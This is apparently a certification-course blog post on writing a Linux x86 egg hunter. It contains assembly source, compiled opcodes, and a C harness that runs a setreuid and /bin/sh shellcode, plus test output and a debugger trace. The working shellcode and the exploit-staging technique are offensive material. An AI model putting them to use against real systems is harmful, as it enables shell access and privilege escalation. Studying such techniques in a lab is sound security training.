# Assignement 3 #

This third exercise is about coding an "Egg Hunter shellcode". This is a way to compensate the lack of memory necessary in order to add up the shellcode in memory. The program searches in memory a sequence indicating the beginning of the shellcode. This sequence must be a series of opcodes that are unlikely to be contiguous so easy to recognize. As we are on a 32 bits architecture we shall use a 4 bytes key (Egg Key).

Source :
https://www.exploit-db.com/docs/english/18482-egg-hunter---a-twist-in-buffer-overflow.pdf
http://www.hick.org/code/skape/papers/egghunt-shellcode.pdf


In order to improve the chances to find it, it is advisable to double its size.

## EggKey definition ##

We are going to use the key "b33fb33f". This choice is arbitrary, it’s a pattern easy to identify and that has few chances of existting out of this context.

The Egg hunter program will browse the memory looking for the key previously defined. When it will try to access to a non-mapped memory area this will cause a system error (SIGSEV). It is thus necessary to know an address reachable in the same segment for the shellcode and the key.

The idea is presented in the below description.

```c
[egg hunter][random memory][egg][shellcode]
````

We are going to create a EggHunter whose function will be to search for the key in the memory. It is necessary to be sure to be in the right segment. 

```c
; Egg Hunter Linux x86 shellcode
; Author: Alain Menelet
; Tested on ubuntu 16.04.3 LTS
; Egg Hunter stack memory


global _start

section .text

_start:
	jmp short valid

validAddress:
	
	pop eax			    ; eax contains a valid address
	mov ebx, 0x3fb33fb3	    ; egg key

_:
	inc eax			    ; increase memory
	cmp dword [eax], ebx        ; compare with the key
	jne _                       ; loop if dfferent
	jmp eax                     ; if equal jump to shellcode



valid:
	call validAddress

```

We compile all of it:

```c
"\xeb\x0d\x58\xbb\xb3\x3f\xb3\x3f\x40\x39\x18\x75\xfb\xff\xe0\xe8\xee\xff\xff\xff";
```

Then we are going to modify the C program so that it takes into account the shellcode, the Egg key and the Egg hunter.

We use the shellcode from assignment 6. It executes a setreuid + /bin/sh.

```c

#include <stdio.h>
#include <stdlib.h>
#include <string.h>

unsigned char egg[] = \
"\xeb\x0d\x58\xbb\xb3\x3f\xb3\x3f\x40\x39\x18\x75\xfb\xff\xe0\xe8\xee\xff\xff\xff";

unsigned char shellcode[] = \
"\xb3\x3f\xb3\x3f" // EggKey
"\x31\xc9\xf7\xe1\x89\xcb\x99\xb0\xa4\xcd\x80\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89\xe1\xb0\x0b\xcd\x80";

int main()
{

	printf("Taille de l'Egg Hhunter %d\nAdresse du Shellcode:%p\n", strlen(egg), shellcode);
	int (*ret)() = (int(*)())egg;
	ret();

return 0;
}

The compilation runs the same way:

gcc -fno-stack-protector -z execstack test_egg.c -o test_egg
```

We test all of it:

```c
phidia@xophidia-VirtualBox:~/Documents/Shellcode/as3$ ./eggHunter_test
Taille de l'Egg Hhunter 20
Adresse du Shellcode: 0x804a060
$ 
```

### Détails : ###

The egg Hunter works as follows:
We notice the address got from the pop eax. It is valid and will be used as start off for the search.

Once the key is found, we make a leap to this address which is the beginning of the shellcode.

```c
EAX: 0x8048074 --> 0x0           ; valid address from jump pop call technique
EBX: 0x3fb33fb3                  ; Egg key
ECX: 0x0 
EDX: 0x0 
ESI: 0x0 
EDI: 0x0 
EBP: 0x0 
ESP: 0xbffff200 --> 0x1 
EIP: 0x8048068 (<_>:	inc    eax) ; loop while the key is not found

[-------------------------------------code-------------------------------------]
   0x804805f:	add    bl,ch
   0x8048061 <_start+1>:	or     eax,0x3fb3bb58
   0x8048066 <validAddress+4>:	mov    bl,0x3f
=> 0x8048068 <_>:	inc    eax
   0x8048069 <_+1>:	cmp    DWORD PTR [eax],ebx
   0x804806b <_+3>:	jne    0x8048068 <_>
   0x804806d <_+5>:	jmp    eax
   0x804806f <valid>:	call   0x8048062 <validAddress>

We observe in the stack the key in the egg as well as at the beginning of the shellcode.

gdb-peda$ x/20x 0x804a040
0x804a040 <egg>:	0xbb580deb	0x3fb33fb3	0x75183940	0xe8e0fffb
0x804a050 <egg+16>:	0xffffffee	0x00000000	0x00000000	0x00000000
0x804a060 <shellcode>:	0x3fb33fb3	0xe1f7c931	0xb099cb89	0xf780cda4
0x804a070 <shellcode+16>:	0x2f6851e1	0x6868732f	0x6e69622f	0x8951e389
0x804a080 <shellcode+32>:	0xe18953e2	0x80cd0bb0	0x00000000	0x00000000
```

This blog post has been created for completing the requirements of the SecurityTube Linux Assembly Expert certification:

http://www.securitytube-training.com/online-courses/securitytube-linux-assembly-expert/

StudentID - SLAE-3763